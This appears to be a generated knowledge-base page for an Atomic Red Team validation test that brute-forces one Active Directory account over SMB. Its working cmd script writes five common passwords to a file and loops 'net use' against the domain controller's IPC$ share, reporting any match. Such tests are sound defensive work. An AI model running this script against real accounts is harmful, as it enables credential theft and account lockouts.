---
atomic_guid: "09480053-2f98-4854-be6e-71ae5f672224"
title: "Brute Force Credentials of single Active Directory domain users via SMB"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.001"
attack_technique_name: "Brute Force: Password Guessing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "09480053-2f98-4854-be6e-71ae5f672224"
  - "Brute Force Credentials of single Active Directory domain users via SMB"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Brute Force Credentials of single Active Directory domain users via SMB

Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller

## Metadata

- Atomic GUID: 09480053-2f98-4854-be6e-71ae5f672224
- Technique: T1110.001: Brute Force: Password Guessing
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1110.001/T1110.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.001]]

## Input Arguments

### user

- description: Account to bruteforce
- type: string
- default: %username%

## Executor

- name: command_prompt

### Command

```cmd
echo Password1> passwords.txt
echo 1q2w3e4r>> passwords.txt
echo Password!>> passwords.txt
echo Spring2022>> passwords.txt
echo ChangeMe!>> passwords.txt
@FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml)
